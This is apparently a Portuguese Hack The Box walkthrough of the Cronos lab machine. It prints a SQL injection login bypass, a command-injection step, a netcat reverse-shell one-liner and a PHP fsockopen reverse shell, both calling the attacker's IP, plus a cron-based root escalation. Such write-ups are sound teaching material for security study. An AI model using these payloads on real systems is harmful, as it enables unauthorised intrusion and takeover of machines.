---
title: "Hack The Box - Cronos"
tags: [Linux,Medium,BurpSuite,SQL Injection,Gobuster,DNS,CronJob,Web]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/11>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas

> Porta 22 -> SSH

> Porta 53 -> DNS

> Portas 80 -> Servidor Web

## Enumeração da porta 80

Abrindo a página verificamos o que tem nela (Porta 80)

Verificamos a página inicial do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_web.png)

## Gobuster

Executamos o gobuster para procurar por diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_gobuster.png)

> gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100

Explicação parâmetros

> dir --> Diretórios

> -u --> URL

> -w --> Wordlist utilizada

> -x --> Vai procurar por arquivos com extensão .php também

> -t --> Aumento o número de threads para ir mais rápido

Estranho não achar nada... vamos enumerar esse DNS na porta 53, depois voltamos pra cá

## Enumeração da porta 53

Como primeira atividade a se fazer para enumerar servidor DNS é descobrir qual nome do domínio, isso fazemos com o nslookup

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_dns.png)

Bom, conseguimos o domínio ns1.cronos.htb

Iss confirma que o endereço base é cronos.htb, mas vamos enumerar mais um pouco agora

### Reverse DNS

Vamos fazer um DNS reverso pra ver se conseguimos encontrar mais endereços, isso acontece muitas vezes pelo fato do servidor DNS estar mal configurado. Geralmente DNS está apenas na porta 53 UDP, o fato dele estar na porta 53 TCP indica uma má configuração

```
dig axfr cronos.htb @10.10.10.13

AXFR, é um tipo de transação de DNS. É um dos mecanismos que os administrato de redes tem para replicar os endereços de DNS entre os servidores.
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_dns1.png)

Encontramos mais endereços!

Adicionamos ao /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_hosts.png)

## Enumerando novamente a porta 80

Agora que conseguimos mais endereços do servidor, vamos voltar a fase de enumeração da porta 80

Ao entrarmos em `cronos.htb` temos uma página totalmente diferente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_cron.png)

Aqui pesquisando um pouco, verificamos que o CMS é *laravel*, mas não sei nem a versão nem como está montado. Não vou perder tempo enumerando, vamos prosseguir.

## Enumeração admin.cronos.htb

Bom, poderiamos rodar novamente o gobuster nesse endereço que encontramos, mas não vamos ter sucesso, também poderíamos rodar o *sqlmap* mas também não vamos ter sucesso, então pra poupar tempo vamos direto ao que interessa.

Essa admin.cronos.htb assim que vi me levantou suspeita, vamos acessar e ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_sql.png)

Sempre que verifico um campo de login e senha, já tento maneiras de fazer sqlinjection nele

```
Enquanto ' or '1'='1 não da jogo, ' or 1=1-- - faz. Isso siginifca que o query pra database está mais ou menos assim:

SELECT * from users where user = '[username]' AND password = '[password]';

Então testamos:
admin ' or 1=1-- -
123
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_sql1.png)

Deu certo!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_sql2.png)

Os comandos disponíveis aqui são traceroute ping... Mas vamos analisar com o BurpSuite por que por lá fica mais fácil de trabalhar

### BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_sql2.png)

Mandamos pro *BurpSuite*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_burp1.png)

Mandamos pro *Repeater*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_burp2.png)

# Exploração

### Testando RCE

Agora vamos testar pra ver se conseguimos de algum modo RCE por aqui

Pô de primeira já conseguimos, se colocarmos ; após o ip e colocarmos o comando a ser executado, ele executa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_burp3.png)

### Reverse shell

Então pegamos um reverse shell na máquina

> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

*rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.119 443 >/tmp/f*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_burp4.png)

Show!

# Escalação de Privilégio

Agora vamos iniciar a escalação de privilégio dessa máquina

Aqui não irei rodar scripts como Linpeas ou LinEnum. Verificando direto as cronjobs de root já identificamos o ponto de escalação

> * * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_priv.png)

Cronjob funcionam assim:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_priv1.png)

Ou seja, isso roda de minuto em minuto

Não sei oq esse script faz, mas como www-data eu tenho permissão pra ler ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_priv2.png)

Adiciono um Reverse Php nele pra minha máquina

```
$sock=fsockopen("10.10.16.119", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_priv3.png)

## Virando root

Na próxima execução do script, viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_priv5.png)

### Pegamos flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_root.png)

# Algo a mais

## Explorando o welcome.php sem ser por SQL Injection

Agora vamos explorar de maneira diferente, vamos supor que ao encontrarmos aquela página web admin.cronos.htb não tinha o painel de login pra testarmos o sqlinjection. Então vamos rodar o gobuter nela pra ver o que encontramos

Executamos o gobuster para procurar por diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_gobuster1.png)

> gobuster dir -u http://admin.cronos.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50

Explicação parâmetros

> dir --> Diretórios

> -u --> URL

> -w --> Wordlist utilizada

> -x --> Vai procurar por arquivos com extensão .php também

> -t --> Aumento o número de threads para ir mais rápido

Opa! Encontramos uns .php diferentes, quando testamos entrar no `welcome.php` ele redireciona pra `login.php`. Será que não podemos mudar isso?

Enviamos a requisição para o `BurpSuite`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b1.png)

Mandamos pro `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b2.png)

Ao enviarmos a requisição vemos que ele da um `302 Found`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b3.png)

Que tal se mudarmos esse 302 Found pra um 200 OK?!

Então abrimos o Burp vamos em `Proxy -> Options -> Match and Replace` e adicionamos pra ele fazer a troca

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b5.png)

Enviamos a requisição clicando em `Forward`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b6.png)

Verificamos na págira agora apareceu direto o `welcome.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-cronos/C_b7.png)

A partir daqui você já sabe o que fazer!